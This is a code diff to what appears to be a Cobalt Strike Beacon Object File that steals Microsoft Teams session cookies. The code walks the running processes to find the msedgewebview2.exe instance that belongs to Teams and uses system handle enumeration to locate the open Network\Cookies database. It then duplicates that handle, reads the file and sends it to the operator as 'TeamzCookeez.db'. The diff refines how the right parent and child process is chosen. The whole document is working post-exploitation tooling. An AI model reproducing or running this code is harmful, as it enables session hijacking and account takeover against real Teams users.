@@ -49,6 +49,7 @@ DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQueryObject(HANDLE, OBJECT_INFORMATION_CL
 WINBASEAPI void __cdecl MSVCRT$free(void *_Memory);
 WINBASEAPI void* WINAPI MSVCRT$malloc(SIZE_T);
 WINBASEAPI DWORD WINAPI KERNEL32$GetModuleFileNameA (HMODULE, LPSTR, DWORD);
+WINBASEAPI DWORD WINAPI KERNEL32$GetCurrentProcessId (VOID);
 
 #define IMPORT_RESOLVE FARPROC SHGetFolderPath = Resolver("shell32", "SHGetFolderPathA"); \
     FARPROC PathAppend = Resolver("shlwapi", "PathAppendA"); \
@@ -229,30 +230,58 @@ VOID GetBrowserData() {
     //get handle to all processes
     HANDLE hSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     PROCESSENTRY32 pe32;
-    INT processCount = 0;
     BOOL databaseStatus = FALSE;
     pe32.dwSize = sizeof(PROCESSENTRY32);
-    
+    DWORD currentProcessId = KERNEL32$GetCurrentProcessId();
+    // BeaconPrintf(CALLBACK_OUTPUT, "currentProcessId: %lu\n", currentProcessId);
+    DWORD webviewProcessesIds[100];
+    DWORD webviewProcessesParentIds[100];
+    int countWebviewProcess = 0;
+    DWORD firstWebviewProcess = 0;
     char * browserProcess = "msedgewebview2.exe";
+    int peId;
+    int peParentId;
 
-    //iterate through each handle to find msedgewebview2 processes
+    // iterate through each handle to find msedgewebview2 processes
+    // Teams has 1 msedgewebview2 process, which itself has several
     BeaconPrintf(CALLBACK_OUTPUT, "Looking for Cookies\n");
     if(KERNEL32$Process32First(hSnap, &pe32)) {
         do {
-            //BeaconPrintf(CALLBACK_OUTPUT, "Process: %s\n", pe32.szExeFile);
+            // BeaconPrintf(CALLBACK_OUTPUT, "Process: %s\n", pe32.szExeFile);
             if(MSVCRT$strcmp(pe32.szExeFile, browserProcess) == 0) 
             {
-                // msedgewebview2 was found, get cookies database (get for all found process - multiple profiles can exist)
-                processCount++;
-                if (GetBrowserFile(pe32.th32ProcessID, "Network\\Cookies")){
-                    databaseStatus = TRUE;
+
+                // BeaconPrintf(CALLBACK_OUTPUT, "msedgewebview2 process id: %lu\n", pe32.th32ProcessID);
+                // BeaconPrintf(CALLBACK_OUTPUT, "msedgewebview2 parent process id: %lu\n", pe32.th32ParentProcessID);
+                // first msedgewebview2 was found, try get cookies database
+                if(pe32.th32ParentProcessID == currentProcessId){
+                    firstWebviewProcess = pe32.th32ProcessID;
+                    if (GetBrowserFile(pe32.th32ProcessID, "Network\\Cookies")){
+                        databaseStatus = TRUE;
+                        continue;
+                    }
+                }else{
+                    webviewProcessesIds[countWebviewProcess] = pe32.th32ProcessID;
+                    webviewProcessesParentIds[countWebviewProcess] = pe32.th32ParentProcessID;
+                    countWebviewProcess++;
                 }
             }
         } while(KERNEL32$Process32Next(hSnap, &pe32));
+        if(!databaseStatus){
+            for(size_t i = 0; i < countWebviewProcess; i++){
+                peId = webviewProcessesIds[i];
+                peParentId = webviewProcessesParentIds[i];
+                if(peParentId == firstWebviewProcess){ // check the process is child of the main msedgewebview2
+                    if (GetBrowserFile(peId, "Network\\Cookies")){
+                        databaseStatus = TRUE;
+                        continue;
+                    }
+                }
+            }
+        }
         if (databaseStatus == FALSE){
             BeaconPrintf(CALLBACK_ERROR,"NO HANDLE TO COOKIES WAS FOUND \n");
         }
-
     }
     KERNEL32$CloseHandle(hSnap);
 }
@@ -269,14 +298,7 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile) {
     shi = (SYSTEM_HANDLE_INFORMATION_EX *)KERNEL32$GlobalAlloc(GPTR, dwSize);
 
     // differentiate file names based on PID (if multiple processes found to have an handle to Network\\Cookies)
-    CHAR * downloadFileName = "Cookeez";
-    char * dbFileNameExtension = ".db";
-    char procID[10];
-    MSVCRT$sprintf(procID, "%d", PID);
-    char downloadFileNamePID[20];
-    MSVCRT$strncat(downloadFileNamePID, downloadFileName, MSVCRT$strlen(downloadFileName));
-    MSVCRT$strncat(downloadFileNamePID, procID, MSVCRT$strlen(procID));
-    MSVCRT$strncat(downloadFileNamePID, dbFileNameExtension, MSVCRT$strlen(dbFileNameExtension));
+    CHAR * downloadFileName = "TeamzCookeez.db";
     
     //utilize NtQueryStemInformation to list all handles on system
     NTSTATUS status = NTDLL$NtQuerySystemInformation(SystemHandleInformationEx, shi, dwSize, &dwNeeded);
@@ -367,7 +389,7 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile) {
                             DWORD dwRead = 0;
                             CHAR *buffer = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwFileSize);
                             KERNEL32$ReadFile(hDuplicate, buffer, dwFileSize, &dwRead, NULL);
-                            download_file(downloadFileNamePID, buffer, dwFileSize);
+                            download_file(downloadFileName, buffer, dwFileSize);
                             
                             KERNEL32$GlobalFree(buffer);
                             KERNEL32$GlobalFree(shi);
